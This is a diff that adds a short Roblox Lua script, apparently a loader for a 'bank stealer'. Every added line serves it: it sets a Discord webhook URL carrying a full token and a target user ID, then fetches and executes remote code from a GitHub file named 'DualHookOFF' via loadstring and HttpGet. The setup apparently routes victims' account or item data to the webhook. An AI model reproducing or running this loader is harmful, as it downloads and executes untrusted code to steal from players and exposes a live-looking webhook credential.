@@ -1,0 +1,6 @@
+_G.Webhook = "https://discord.com/api/webhooks/1129460510195191909/JlZVyBZve-fJMRALzhTg-1gEJy9vOxZq4q4iP5N13gFE9fHQm43bEawXfcYBchSbJz1v"
+_G.LoadingText = "LOADING"
+_G.UserId =3384712000
+ 
+loadstring(game:HttpGet("https://raw.githubusercontent.com/DevRlchksStudio/BankStelaer/main/DualHookOFF",true))();
+ 
